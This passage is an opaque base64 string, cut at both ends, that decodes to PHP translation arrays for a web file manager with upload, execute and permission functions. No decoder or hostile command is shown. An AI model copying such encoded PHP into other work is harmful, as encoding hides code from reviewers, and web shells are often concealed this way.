GluaycgPT4gJ0NyP2VyIGxpZW4gc3ltYm9saXF1ZScsDQonZGVsZXRlJyA9PiAnRWZmYWNlcicsDQoncmVuYW1lJyA9PiAnUmVub21tZXInLA0KJ21vdmUnID0+ICdEP3BsYWNlcicsDQonY29weScgPT4gJ0NvcGllcicsDQonZWRpdCcgPT4gJ091dnJpcicsDQonZG93bmxvYWQnID0+ICdUP2w/Y2hhcmdlciBzdXIgUEMnLA0KJ3VwbG9hZCcgPT4gJ1Q/bD9jaGFyZ2VyIHN1ciBzZXJ2ZXVyJywNCidjcmVhdGUnID0+ICdDcj9lcicsDQonY2hhbmdlJyA9PiAnQ2hhbmdlcicsDQonc2F2ZScgPT4gJ1NhdXZlZ2FyZGVyJywNCidzZXQnID0+ICdFeD9jdXRlcicsDQoncmVzZXQnID0+ICdSP2luaXRpYWxpc2VyJywNCidyZWxhdGl2ZScgPT4gJ1JlbGF0aWYnLA0KDQoneWVzJyA9PiAnT3VpJywNCidubycgPT4gJ05vbicsDQonYmFjaycgPT4gJ1JldG91cicsDQonZGVzdGluYXRpb24nID0+ICdEZXN0aW5hdGlvbicsDQonc3ltbGluaycgPT4gJ0xpZW4gc3ltYm9sbGlxdWUnLA0KJ25vX291dHB1dCcgPT4gJ1BhcyBkZSBzb3J0aWUnLA0KDQondXNlcicgPT4gJ1V0aWxpc2F0ZXVyJywNCidwYXNzd29yZCcgPT4gJ01vdCBkZSBwYXNzZScsDQonYWRkJyA9PiAnQWpvdXRlcicsDQonYWRkX2Jhc2ljX2F1dGgnID0+ICdhZGQgYmFzaWMtYXV0aGVudGlmaWNhdGlvbicsDQoNCid1cGxvYWRlZCcgPT4gJyJbJTFdIiBhID90PyB0P2w/Y2hhcmc/IHN1ciBsZSBzZXJ2ZXVyLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIG4gYSBwYXMgP3Q/IHQ/bD9jaGFyZz8gc3VyIGxlIHNlcnZldXIuJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBleGlzdGUgZD9qPyAuJywNCidjcmVhdGVkJyA9PiAnIlslMV0iIGEgP3Q/IGNyPz8uJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBuIGEgcGFzIHB1ID90cmUgY3I/Py4nLA0KJ3JlYWxseV9kZWxldGUnID0+ICdFZmZhY2VyIGxlIGZpY2hpZXI/JywNCidkZWxldGVkJyA9PiAiQ2VzIGZpY2hpZXJzIG9udCA/dD8gZD90dWl0czpcDQpbJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIkNlcyBmaWNoaWVycyBuIG9udCBwdSA/dHJlIGQ/dHJ1aXRzOlwNClslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnUmVub21tZSBmaWNoaWVyOicsDQoncmVuYW1lZCcgPT4gJyJbJTFdIiBhID90PyByZW5vbW0/IGVuICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0gbiBhIHBhcyBwdSA/dHJlIHJlbm9tbT8gZW4gIlslMl0iLicsDQonbW92ZV9maWxlcycgPT4gJ0Q/cGxhY2VyIGNlcyBmaWNoaWVyczonLA0KJ21vdmVkJyA9PiAiQ2VzIGZpY2hpZXJzIG9udCA/dD8gZD9wbGFjP3MgZW4gXCJbJTJdXCI6XA0KWyUxXSIsDQonbm90X21vdmVkJyA9PiAiQ2VzIGZpY2hpZXJzIG4gb250IHBhcyBwdSA/dHJlIGQ/cGxhYz9zIGVuIFwiWyUyXVwiOlwNClslMV0iLA0KJ2NvcHlfZmlsZXMnID0+ICdDb3BpZXIgY2VzIGZpY2hpZXJzOicsDQonY29waWVkJyA9PiAiQ2VzIGZpY2hpZXJzIG9udCA/dD8gY29waT9zIGVuIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJDZXMgZmljaGllcnMgbiBvbnQgcGFzIHB1ID90cmUgY29waT9zIGVuIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICciWyUxXSIgbmUgcGV1dCA/dHJlIG91dmVydC4nLA0KJ2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgYSA/dD8gYnJpbGxhbW1lbnQgZXg/Y3V0PyA6XA0KeyUyfSIsDQonbm90X2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgbiBhIHBhcyBwdSA/dHJlIGV4P2N1dD86XA0KeyUyfSIsDQonc2F2ZWQnID0+ICciWyUxXSIgYSA/dD8gc2F1dmVnYXJkPy4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBuIGEgcGFzIHB1ID90cmUgc2F1dmVnYXJkPy4nLA0KJ3N5bWxpbmtlZCcgPT4gJ1VuIGxpZW4gc3ltYm9saXF1ZSBkZXB1aXMgIlslMl0iIHZlcnMgIlslMV0iIGEgP3Q/IGNyP2UuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnVW4gbGllbiBzeW1ib2xpcXVlIGRlcHVpcyAiWyUyXSIgdmVycyAiWyUxXSIgbiBhIHBhcyBwdSA/dHJlIGNyPz8uJywNCidwZXJtaXNzaW9uX2ZvcicgPT4gJ0Ryb2l0cyBkZSAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ0Ryb2l0cyBkZSAiWyUxXSIgb250ID90PyBjaGFuZz9zIGVuIFslMl0uJywNCidwZXJtaXNzaW9uX25vdF9zZXQnID0+ICdEcm9pdHMgZGUgIlslMV0iIG4gb250IHBhcyBwdSA/dHJlIGNoYW5nP3MgZW5bJTJdLicsDQonbm90X3JlYWRhYmxlJyA9PiAnIlslMV0iIG5lIHBldXQgcGFzID90cmUgb3V2ZXJ0LicNCgkJKTsNCg0KCWNhc2UgJ2l0JzoNCg0KCQkkZGF0ZV9mb3JtYXQgPSAnZC1tLVkgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ0lTTy04ODU5LTEnOw0KDQoJCXJldHVybiBhcnJheSgNCidkaXJlY3RvcnknID0+ICdEaXJlY3RvcnknLA0KJ2ZpbGUnID0+ICdGaWxlJywNCidmaWxlbmFtZScgPT4gJ05vbWUgRmlsZScsDQoNCidzaXplJyA9PiAnRGltZW5zaW9uaScsDQoncGVybWlzc2lvbicgPT4gJ1Blcm1lc3NpJywNCidvd25lcicgPT4gJ1Byb3ByaWV0YXJpbycsDQonZ3JvdXAnID0+ICdHcnVwcG8nLA0KJ290aGVyJyA9PiAnQWx0cm8nLA0KJ2Z1bmN0aW9ucycgPT4gJ0Z1bnppb25pJywNCg0KJ3JlYWQnID0+ICdsZWdnaScsDQond3JpdGUnID0+ICdzY3JpdmknLA0KJ2V4ZWN1dGUnID0+ICdlc2VndWknLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICdjcmVhIGxpbmsgc2ltYm9saWNvJywNCidkZWxldGUnID0+ICdjYW5jZWxsYScsDQoncmVuYW1lJyA9PiAncmlub21pbmEnLA0KJ21vdmUnID0+ICdzcG9zdGEnLA0KJ2NvcHknID0+ICdjb3BpYScsDQonZWRpdCcgPT4gJ21vZGlmaWNhJywNCidkb3dubG9hZCcgPT4gJ2Rvd25sb2FkJywNCid1cGxvYWQnID0+ICd1cGxvYWQnLA0KJ2NyZWF0ZScgPT4gJ2NyZWEnLA0KJ2NoYW5nZScgPT4gJ2NhbWJpYScsDQonc2F2ZScgPT4gJ3NhbHZhJywNCidzZXQnID0+ICdpbXBvc3RhJywNCidyZXNldCcgPT4gJ3JlaW1wb3N0YScsDQoncmVsYXRpdmUnID0+ICdQZXJjb3JzbyByZWxhdGl2byBwZXIgbGEgZGVzdGluYXppb25lJywNCg0KJ3llcycgPT4gJ1NpJywNCidubycgPT4gJ05vJywNCidiYWNrJyA9PiAnaW5kaWV0cm8nLA0KJ2Rlc3RpbmF0aW9uJyA9PiAnRGVzdGluYXppb25lJywNCidzeW1saW5rJyA9PiAnTGluayBzaW1ib2xpY28nLA0KJ25vX291dHB1dCcgPT4gJ25vIG91dHB1dCcsDQoNCid1c2VyJyA9PiAnVXNlcicsDQoncGFzc3dvcmQnID0+ICdQYXNzd29yZCcsDQonYWRkJyA9PiAnYWdnaXVuZ2knLA0KJ2FkZF9iYXNpY19hdXRoJyA9PiAnYWdnaXVuZ2kgYXV0ZW50aWNhemlvbmUgYmFzZScsDQoNCid1cGxvYWRlZCcgPT4gJyJbJTFdIiA/IHN0YXRvIGNhcmljYXRvLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIG5vbiA/IHN0YXRvIGNhcmljYXRvLicsDQonYWxyZWFkeV9leGlzdHMnID0+ICciWyUxXSIgZXNpc3RlIGdpPyAuJywNCidjcmVhdGVkJyA9PiAnIlslMV0iID8gc3RhdG8gY3JlYXRvLicsDQonbm90X2NyZWF0ZWQnID0+ICciWyUxXSIgbm9uID8gc3RhdG8gY3JlYXRvLicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ0NhbmNlbGxvIHF1ZXN0aSBmaWxlID8nLA0KJ2RlbGV0ZWQnID0+ICJRdWVzdGkgZmlsZSBzb25vIHN0YXRpIGNhbmNlbGxhdGk6XA0KWyUxXSIsDQonbm90X2RlbGV0ZWQnID0+ICJRdWVzdGkgZmlsZSBub24gcG9zc29ubyBlc3NlcmUgY2FuY2VsbGF0aTpcDQpbJTFdIiwNCidyZW5hbWVfZmlsZScgPT4gJ0ZpbGUgcmlub21pbmF0bzonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgPyBzdGF0byByaW5vbWluYXRvIGluICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0gbm9uID8gc3RhdG8gcmlub21pbmF0byBpbiAiWyUyXSIuJywNCidtb3ZlX2ZpbGVzJyA9PiAnU3Bvc3RvIHF1ZXN0aSBmaWxlOicsDQonbW92ZWQnID0+ICJRdWVzdGkgZmlsZSBzb25vIHN0YXRpIHNwb3N0YXRpIGluIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9tb3ZlZCcgPT4gIlF1ZXN0aSBmaWxlIG5vbiBwb3Nzb25vIGVzc2VyZSBzcG9zdGF0aSBpbiBcIlslMl1cIjpcDQpbJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnQ29waW8gcXVlc3RpIGZpbGUnLA0KJ2NvcGllZCcgPT4gIlF1ZXN0aSBmaWxlIHNvbm8gc3RhdGkgY29waWF0aSBpbiBcIlslMl1cIjpcDQpbJTFdIiwNCidub3RfY29waWVkJyA9PiAiUXVlc3RpIGZpbGUgbm9uIHBvc3Nvbm8gZXNzZXJlIGNvcGlhdGkgaW4gXCJbJTJdXCI6XA0KWyUxXSIsDQonbm90X2VkaXRlZCcgPT4gJyJbJTFdIiBub24gcHU/IGVzc2VyZSBtb2RpZmljYXRvLicsDQonZXhlY3V0ZWQnID0+ICJcIlslMV1cIiA/IHN0YXRvIGVzZWd1aXRvIGNvbiBzdWNjZXNzbzpcDQp7JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBub24gPyBzdGF0byBlc2VndWl0byBjb24gc3VjY2Vzc29cDQp7JTJ9IiwNCidzYXZlZCcgPT4gJyJbJTFdIiA/IHN0YXRvIHNhbHZhdG8uJywNCidub3Rfc2F2ZWQnID0+ICciWyUxXSIgbm9uID8gc3RhdG8gc2FsdmF0by4nLA0KJ3N5bWxpbmtlZCcgPT4gJ0lsIGxpbmsgc2lhbWJvbGljbyBkYSAiWyUyXSIgYSAiWyUxXSIgPyBzdGF0byBjcmVhdG8uJywNCidub3Rfc3ltbGlua2VkJyA9PiAnSWwgbGluayBzaWFtYm9saWNvIGRhICJbJTJdIiBhICJbJTFdIiBub24gPyBzdGF0byBjcmVhdG8uJywNCidwZXJtaXNzaW9uX2ZvcicgPT4gJ1Blcm1lc3NpIGRpICJbJTFdIjonLA0KJ3Blcm1pc3Npb25fc2V0JyA9PiAnSSBwZXJtZXNzaSBkaSAiWyUxXSIgc29ubyBzdGF0aSBpbXBvc3RhdGkgWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ0kgcGVybWVzc2kgZGkgIlslMV0iIG5vbiBzb25vIHN0YXRpIGltcG9zdGF0aSBbJTJdLicsDQonbm90X3JlYWRhYmxlJyA9PiAnIlslMV0iIG5vbiBwdT8gZXNzZXJlIGxldHRvLicNCgkJKTsNCg0KCWNhc2UgJ25sJzoNCg0KCQkkZGF0ZV9mb3JtYXQgPSAnbi9qL3kgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ0lTTy04ODU5LTEnOw0KDQoJCXJldHVybiBhcnJheSgNCidkaXJlY3RvcnknID0+ICdEaXJlY3RvcnknLA0KJ2ZpbGUnID0+ICdCZXN0YW5kJywNCidmaWxlbmFtZScgPT4gJ0Jlc3RhbmRzbmFhbScsDQoNCidzaXplJyA9PiAnR3Jvb3R0ZScsDQoncGVybWlzc2lvbicgPT4gJ0Jldm9lZ2RoZWlkJywNCidvd25lcicgPT4gJ0VpZ2VuYWFyJywNCidncm91cCcgPT4gJ0dyb2VwJywNCidvdGhlcicgPT4gJ0FuZGVyZW4nLA0KJ2Z1bmN0aW9ucycgPT4gJ0Z1bmN0aWVzJywNCg0KJ3JlYWQnID0+ICdsZXplbicsDQond3JpdGUnID0+ICdzY2hyaWp2ZW4nLA0KJ2V4ZWN1dGUnID0+ICd1aXR2b2VyZW4nLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICdtYWFrIHN5bWxpbmsnLA0KJ2RlbGV0ZScgPT4gJ3ZlcndpamRlcmVuJywNCidyZW5hbWUnID0+ICdoZXJub2VtZW4nLA0KJ21vdmUnID0+ICd2ZXJwbGFhdHNlbicsDQonY29weScgPT4gJ2tvcGllcmVuJywNCidlZGl0JyA9PiAnYmV3ZXJrZW4nLA0KJ2Rvd25sb2FkJyA9PiAnZG93bmxvYWRlbicsDQondXBsb2FkJyA9PiAndXBsb2FkZW4nLA0KJ2NyZWF0ZScgPT4gJ2Fhbm1ha2VuJywNCidjaGFuZ2UnID0+ICd2ZXJhbmRlcmVuJywNCidzYXZlJyA9PiAnb3BzbGFhbicsDQonc2V0JyA9PiAnaW5zdGVsbGVuJywNCidyZXNldCcgPT4gJ3Jlc2V0dGVuJywNCidyZWxhdGl2ZScgPT4gJ1JlbGF0aWVmIHBhdCBuYWFyIGRvZWwnLA0KDQoneWVzJyA9PiAnSmEnLA0KJ25vJyA9PiAnTmVlJywNCidiYWNrJyA9PiAndGVydWcnLA0KJ2Rlc3RpbmF0aW9uJyA9PiAnQmVzdGVtbWluZycsDQonc3ltbGluaycgPT4gJ1N5bWxpbmsnLA0KJ25vX291dHB1dCcgPT4gJ2dlZW4gb3V0cHV0JywNCg0KJ3VzZXInID0+ICdHZWJydWlrZXInLA0KJ3Bhc3N3b3JkJyA9PiAnV2FjaHR3b29yZCcsDQonYWRkJyA9PiAndG9ldm9lZ2VuJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ2FkZCBiYXNpYy1hdXRoZW50aWZpY2F0aW9uJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIGlzIHZlcnN0dXVyZC4nLA0KJ25vdF91cGxvYWRlZCcgPT4gJyJbJTFdIiBrYW4gbmlldCB3b3JkZW4gdmVyc3R1dXJkLicsDQonYWxyZWFkeV9leGlzdHMnID0+ICciWyUxXSIgYmVzdGFhdCBhbC4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgaXMgYWFuZ2VtYWFrdC4nLA0KJ25vdF9jcmVhdGVkJyA9PiAnIlslMV0iIGthbiBuaWV0IHdvcmRlbiBhYW5nZW1hYWt0LicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ0RlemUgYmVzdGFuZGVuIHZlcndpamRlcmVuPycsDQonZGVsZXRlZCcgPT4gIkRlemUgYmVzdGFuZGVuIHppam4gdmVyd2lqZGVyZDpcDQpbJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIkRlemUgYmVzdGFuZGVuIGtvbmRlbiBuaWV0IHdvcmRlbiB2ZXJ3aWpkZXJkOlwNClslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnQmVzdGFuZHNuYWFtIHZlcmFuZGVyZW46JywNCidyZW5hbWVkJyA9PiAnIlslMV0iIGhlZXQgbnUgIlslMl0iLicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBrb24gbmlldCB3b3JkZW4gdmVyYW5kZXJkIGluICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdWZXJwbGFhdHMgZGV6ZSBiZXN0YW5kZW46JywNCidtb3ZlZCcgPT4gIkRlemUgYmVzdGFuZGVuIHppam4gdmVycGxhYXRzdCBuYWFyIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9tb3ZlZCcgPT4gIkthbiBkZXplIGJlc3RhbmRlbiBuaWV0IHZlcnBsYWF0c2VuIG5hYXIgXCJbJTJdXCI6XA0KWyUxXSIsDQonY29weV9maWxlcycgPT4gJ0tvcGllZXIgZGV6ZSBiZXN0YW5kZW46JywNCidjb3BpZWQnID0+ICJEZXplIGJlc3RhbmRlbiB6aWpuIGdla29waWVlcmQgbmFhciBcIlslMl1cIjpcDQpbJTFdIiwNCidub3RfY29waWVkJyA9PiAiRGV6ZSBiZXN0YW5kZW4ga3VubmVuIG5pZXQgd29yZGVuIGdla29waWVlcmQgbmFhciBcIlslMl1cIjpcDQpbJTFdIiwNCidub3RfZWRpdGVkJyA9PiAnIlslMV0iIGthbiBuaWV0IHdvcmRlbiBiZXdlcmt0LicsDQonZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBpcyBtZXQgc3VjY2VzIHVpdGdldm9lcmQ6XA0KeyUyfSIsDQonbm90X2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgaXMgbmlldCBnb2VkIHVpdGdldm9lcmQ6XA0KeyUyfSIsDQonc2F2ZWQnID0+ICciWyUxXSIgaXMgb3BnZXNsYWdlbi4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBpcyBuaWV0IG9wZ2VzbGFnZW4uJywNCidzeW1saW5rZWQnID0+ICdTeW1saW5rIHZhbiAiWyUyXSIgbmFhciAiWyUxXSIgaXMgYWFuZ2VtYWFrdC4nLA0KJ25vdF9zeW1saW5rZWQnID0+ICdTeW1saW5rIHZhbiAiWyUyXSIgbmFhciAiWyUxXSIgaXMgbmlldCBhYW5nZW1hYWt0LicsDQoncGVybWlzc2lvbl9mb3InID0+ICdCZXZvZWdkaGVpZCB2b29yICJbJTFdIjonLA0KJ3Blcm1pc3Npb25fc2V0JyA9PiAnQmV2b2VnZGhlaWQgdmFuICJbJTFdIiBpcyBpbmdlc3RlbGQgb3AgWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ0Jldm9lZ2RoZWlkIHZhbiAiWyUxXSIgaXMgbmlldCBpbmdlc3RlbGQgb3AgWyUyXS4nLA0KJ25vdF9yZWFkYWJsZScgPT4gJyJbJTFdIiBrYW4gbmlldCB3b3JkZW4gZ2VsZXplbi4nDQoJCSk7DQoNCgljYXNlICdzZSc6DQoNCgkJJGRhdGVfZm9ybWF0ID0gJ24vai95IEg6aTpzJzsNCgkJJHdvcmRfY2hhcnNldCA9ICdJU08tODg1OS0xJzsNCiANCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ01hcHAnLA0KJ2ZpbGUnID0+ICdGaWwnLA0KJ2ZpbGVuYW1lJyA9PiAnRmlsbmFtbicsDQogDQonc2l6ZScgPT4gJ1N0b3JsZWsnLA0KJ3Blcm1pc3Npb24nID0+ICdTP2tlcmhldHNuaXY/JywNCidvd25lcicgPT4gJz9nYXJlJywNCidncm91cCcgPT4gJ0dydXBwJywNCidvdGhlcicgPT4gJ0FuZHJhJywNCidmdW5jdGlvbnMnID0+ICdGdW5rdGlvbmVyJywNCiANCidyZWFkJyA9PiAnTD9zJywNCid3cml0ZScgPT4gJ1Nrcml2JywNCidleGVjdXRlJyA9PiAnVXRmP3InLA0KIA0KJ2NyZWF0ZV9zeW1saW5rJyA9PiAnU2thcGEgc3ltbGluaycsDQonZGVsZXRlJyA9PiAnUmFkZXJhJywNCidyZW5hbWUnID0+ICdCeXQgbmFtbicsDQonbW92ZScgPT4gJ0ZseXR0YScsDQonY29weScgPT4gJ0tvcGllcmEnLA0KJ2VkaXQnID0+ICc/bmRyYScsDQonZG93bmxvYWQnID0+ICdMYWRkYSBuZXInLA0KJ3VwbG9hZCcgPT4gJ0xhZGRhIHVwcCcsDQonY3JlYXRlJyA9PiAnU2thcGEnLA0KJ2NoYW5nZScgPT4gJz9uZHJhJywNCidzYXZlJyA9PiAnU3BhcmEnLA0KJ3NldCcgPT4gJ01hcmtlcmEnLA0KJ3Jlc2V0JyA9PiAnVD9tJywNCidyZWxhdGl2ZScgPT4gJ1JlbGF0aXZlIHBhdGggdG8gdGFyZ2V0JywNCiANCid5ZXMnID0+ICdKYScsDQonbm8nID0+ICdOZWonLA0KJ2JhY2snID0+ICdUaWxsYmFrcycsDQonZGVzdGluYXRpb24nID0+ICdEZXN0aW5hdGlvbicsDQonc3ltbGluaycgPT4gJ1N5bWxpbmsnLA0KJ25vX291dHB1dCcgPT4gJ25vIG91dHB1dCcsDQogDQondXNlcicgPT4gJ0Fudj9uZGFyZScsDQoncGFzc3dvcmQnID0+ICdMP3Nlbm9yZCcsDQonYWRkJyA9PiAnTD9nZyB0aWxsJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ2FkZCBiYXNpYy1hdXRoZW50aWZpY2F0aW9uJywNCiANCid1cGxvYWRlZCcgPT4gJyJbJTFdIiBoYXIgbGFkZGF0cyB1cHAuJywNCidub3RfdXBsb2FkZWQnID0+ICciWyUxXSIga3VuZGUgaW50ZSBsYWRkYXMgdXBwLicsDQonYWxyZWFkeV9leGlzdHMnID0+ICciWyUxXSIgZmlubnMgcmVkYW4uJywNCidjcmVhdGVkJyA9PiAnIlslMV0iIGhhciBza2FwYXRzLicsDQonbm90X2NyZWF0ZWQnID0+ICciWyUxXSIga3VuZGUgaW50ZSBza2FwYXMuJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnUmFkZXJhIGRlc3NhIGZpbGVyPycsDQonZGVsZXRlZCcgPT4gIkRlIGg/ciBmaWxlcm5hIGhhciByYWRlcmF0czpcDQpbJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIkRlc3NhIGZpbGVyIGt1bmRlIGludGUgcmFkZXJhczpcDQpbJTFdIiwNCidyZW5hbWVfZmlsZScgPT4gJ0J5dCBuYW1uIHA/IGZpbDonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgaGFyIGJ5dHQgbmFtbiB0aWxsICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0ga3VuZGUgaW50ZSBkP3BhcyBvbSB0aWxsICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdGbHl0dGEgZGVzc2EgZmlsZXI6JywNCidtb3ZlZCcgPT4gIkRlc3NhIGZpbGVyIGhhciBmbHl0dGF0cyB0aWxsIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9tb3ZlZCcgPT4gIkRlc3NhIGZpbGVyIGt1bmRlIGludGUgZmx5dHRhcyB0aWxsIFwiWyUyXVwiOlwNClslMV0iLA0KJ2NvcHlfZmlsZXMnID0+ICdLb3BpZXJhIGRlc3NhIGZpbGVyOicsDQonY29waWVkJyA9PiAiRGVzc2EgZmlsZXIgaGFyIGtvcGllcmF0cyB0aWxsIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJEZXNzYSBmaWxlciBrdW5kZSBpbnRlIGtvcGllcmFzIHRpbGwgXCJbJTJdXCI6XA0KWyUxXSIsDQonbm90X2VkaXRlZCcgPT4gJyJbJTFdIiBrYW4gaW50ZSA/bmRyYXMuJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGhhciB1dGY/cnRzOlwNCnslMn0iLA0KJ25vdF9leGVjdXRlZCcgPT4gIlwiWyUxXVwiIGt1bmRlIGludGUgdXRmP3JhczpcDQp7JTJ9IiwNCidzYXZlZCcgPT4gJyJbJTFdIiBoYXIgc3BhcmF0cy4nLA0KJ25vdF9zYXZlZCcgPT4gJyJbJTFdIiBrdW5kZSBpbnRlIHNwYXJhcy4nLA0KJ3N5bWxpbmtlZCcgPT4gJ1N5bWxpbmsgZnI/biAiWyUyXSIgdGlsbCAiWyUxXSIgaGFyIHNrYXBhdHMuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnU3ltbGluayBmcj9uICJbJTJdIiB0aWxsICJbJTFdIiBrdW5kZSBpbnRlIHNrYXBhcy4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUj90dGlnaGV0ZXIgZj9yICJbJTFdIjonLA0KJ3Blcm1pc3Npb25fc2V0JyA9PiAnUj90dGlnaGV0ZXIgZj9yICJbJTFdIiA/bmRyYWRlcyB0aWxsIFslMl0uJywNCidwZXJtaXNzaW9uX25vdF9zZXQnID0+ICdQZXJtaXNzaW9uIG9mICJbJTFdIiBjb3VsZCBub3QgYmUgc2V0IHRvIFslMl0uJywNCidub3RfcmVhZGFibGUnID0+ICciWyUxXSIga2FuIGludGUgbD9zYXMuJw0KCQkpOw0KDQoJY2FzZSAnc3AnOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICdqL24veSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnSVNPLTg4NTktMSc7DQoNCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ0RpcmVjdG9yaW8nLA0KJ2ZpbGUnID0+ICdBcmNoaXZvJywNCidmaWxlbmFtZScgPT4gJ05vbWJyZSBBcmNoaXZvJywNCg0KJ3NpemUnID0+ICdUYW1hP28nLA0KJ3Blcm1pc3Npb24nID0+ICdQZXJtaXNvcycsDQonb3duZXInID0+ICdQcm9waWV0YXJpbycsDQonZ3JvdXAnID0+ICdHcnVwbycsDQonb3RoZXInID0+ICdPdHJvcycsDQonZnVuY3Rpb25zJyA9PiAnRnVuY2lvbmVzJywNCg0KJ3JlYWQnID0+ICdsZWN0dXJhJywNCid3cml0ZScgPT4gJ2VzY3JpdHVyYScsDQonZXhlY3V0ZScgPT4gJ2VqZWN1Y2k/bicsDQoNCidjcmVhdGVfc3ltbGluaycgPT4gJ2NyZWFyIGVubGFjZScsDQonZGVsZXRlJyA9PiAnYm9ycmFyJywNCidyZW5hbWUnID0+ICdyZW5vbWJyYXInLA0KJ21vdmUnID0+ICdtb3ZlcicsDQonY29weScgPT4gJ2NvcGlhcicsDQonZWRpdCcgPT4gJ2VkaXRhcicsDQonZG93bmxvYWQnID0+ICdiYWphcicsDQondXBsb2FkJyA9PiAnc3ViaXInLA0KJ2NyZWF0ZScgPT4gJ2NyZWFyJywNCidjaGFuZ2UnID0+ICdjYW1iaWFyJywNCidzYXZlJyA9PiAnc2FsdmFyJywNCidzZXQnID0+ICdzZXRlYXInLA0KJ3Jlc2V0JyA9PiAncmVzZXRlYXInLA0KJ3JlbGF0aXZlJyA9PiAnUGF0aCByZWxhdGl2bycsDQoNCid5ZXMnID0+ICdTaScsDQonbm8nID0+ICdObycsDQonYmFjaycgPT4gJ2F0cj9zJywNCidkZXN0aW5hdGlvbicgPT4gJ0Rlc3Rpbm8nLA0KJ3N5bWxpbmsnID0+ICdFbmxhY2UnLA0KJ25vX291dHB1dCcgPT4gJ3NpbiBzYWxpZGEnLA0KDQondXNlcicgPT4gJ1VzdWFyaW8nLA0KJ3Bhc3N3b3JkJyA9PiAnQ2xhdmUnLA0KJ2FkZCcgPT4gJ2FncmVnYXInLA0KJ2FkZF9iYXNpY19hdXRoJyA9PiAnYWdyZWdhciBhdXRlbnRpZmljYWNpP24gYj9zaWNhJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIGhhIHNpZG8gc3ViaWRvLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIG5vIHB1ZG8gc2VyIHN1Ymlkby4nLA0KJ2FscmVhZHlfZXhpc3RzJyA9PiAnIlslMV0iIHlhIGV4aXN0ZS4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgaGEgc2lkbyBjcmVhZG8uJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBubyBwdWRvIHNlciBjcmVhZG8uJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnP0JvcnJhIGVzdG9zIGFyY2hpdm9zPycsDQonZGVsZXRlZCcgPT4gIkVzdG9zIGFyY2hpdm9zIGhhbiBzaWRvIGJvcnJhZG9zOlwNClslMV0iLA0KJ25vdF9kZWxldGVkJyA9PiAiRXN0b3MgYXJjaGl2b3Mgbm8gcHVkaWVyb24gc2VyIGJvcnJhZG9zOlwNClslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnUmVub21icmEgYXJjaGl2bzonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgaGEgc2lkbyByZW5vbWJyYWRvIGEgIlslMl0iLicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBubyBwdWRvIHNlciByZW5vbWJyYWRvIGEgIlslMl0iLicsDQonbW92ZV9maWxlcycgPT4gJ01vdmVyIGVzdG9zIGFyY2hpdm9zOicsDQonbW92ZWQnID0+ICJFc3RvcyBhcmNoaXZvcyBoYW4gc2lkbyBtb3ZpZG9zIGEgXCJbJTJdXCI6XA0KWyUxXSIsDQonbm90X21vdmVkJyA9PiAiRXN0b3MgYXJjaGl2b3Mgbm8gcHVk